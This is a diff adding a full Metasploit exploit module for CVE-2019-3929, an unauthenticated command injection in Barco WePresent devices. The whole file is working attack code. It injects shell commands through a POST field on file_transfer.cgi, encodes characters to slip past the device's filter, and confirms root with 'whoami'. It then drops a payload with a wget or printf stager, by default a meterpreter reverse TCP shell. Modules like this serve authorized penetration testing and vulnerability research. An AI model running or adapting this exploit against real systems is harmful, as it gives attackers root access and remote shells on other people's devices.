@@ -1,0 +1,105 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::CmdStager
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => "Barco WePresent file_transfer.cgi Command Injection",
+      'Description'    => %q(
+        This module exploits an unauthenticated remote command injection
+        vulnerability found in Barco WePresent and related OEM'ed products.
+        The vulnerability is triggered via an HTTP POST request to the
+        file_transfer.cgi endpoint.
+      ),
+      'License'        => MSF_LICENSE,
+      'Author'         => 'Jacob Baines', # @Junior_Baines'
+      'References'     =>
+        [
+          ['CVE', '2019-3929'],
+          ['EDB', '46786'],
+          ['URL', 'https://medium.com/tenable-techblog/eight-devices-one-exploit-f5fc28c70a7c']
+        ],
+      'DisclosureDate' => "Apr 30, 2019",
+      'Platform'       => ['unix', 'linux'],
+      'Arch'           => [ARCH_CMD, ARCH_ARMLE],
+      'Privileged'     => false,
+      'Targets'        => [
+        ['Unix In-Memory',
+         'Platform'    => 'unix',
+         'Arch'        => ARCH_CMD,
+         'Type'        => :unix_memory,
+         'Payload'     => {
+           'Compat' => { 'PayloadType' => 'cmd', 'RequiredCmd' => 'telnetd' }
+         }],
+        ['Linux Dropper',
+         'Platform'        => 'linux',
+         'Arch'            => ARCH_ARMLE,
+         'CmdStagerFlavor' => ['printf', 'wget'],
+         'Type'            => :linux_dropper]
+      ],
+      'DefaultTarget'  => 1,
+      'DefaultOptions' => {
+        'SSL'               => true,
+        'RPORT'             => 443,
+        'CMDSTAGER::FLAVOR' => 'printf',
+        'PAYLOAD'           => 'linux/armle/meterpreter/reverse_tcp'
+      }))
+  end
+
+  def filter_bad_chars(cmd)
+    cmd.gsub!(/;/, 'Pa_Note')
+    cmd.gsub!(/\+/, 'Pa_Add')
+    cmd.gsub!(/&/, 'Pa_Amp')
+    return cmd
+  end
+
+  def send_command(cmd, timeout)
+    vars_post = {
+      file_transfer: 'new',
+      dir: "'#{filter_bad_chars(cmd)}'"
+    }
+
+    send_request_cgi({
+      'uri'       => '/cgi-bin/file_transfer.cgi',
+      'method'    => 'POST',
+      'vars_post' => vars_post
+    }, timeout)
+  end
+
+  def check
+    check_resp = send_command(";whoami;", 5)
+    unless check_resp
+      return CheckCode::Unknown('Connection failed.')
+    end
+
+    if check_resp.code == 200
+      check_resp.body.gsub!(/[\r\n]/, "")
+      if check_resp.body == "root"
+        return CheckCode::Vulnerable
+      end
+    end
+
+    CheckCode::Safe
+  end
+
+  def execute_command(cmd, _opts = {})
+    send_command(";(#{cmd})&", nil)
+  end
+
+  def exploit
+    case target['Type']
+    when :unix_memory
+      execute_command(payload.encoded)
+    when :linux_dropper
+      execute_cmdstager(linemax: 128)
+    end
+  end
+end
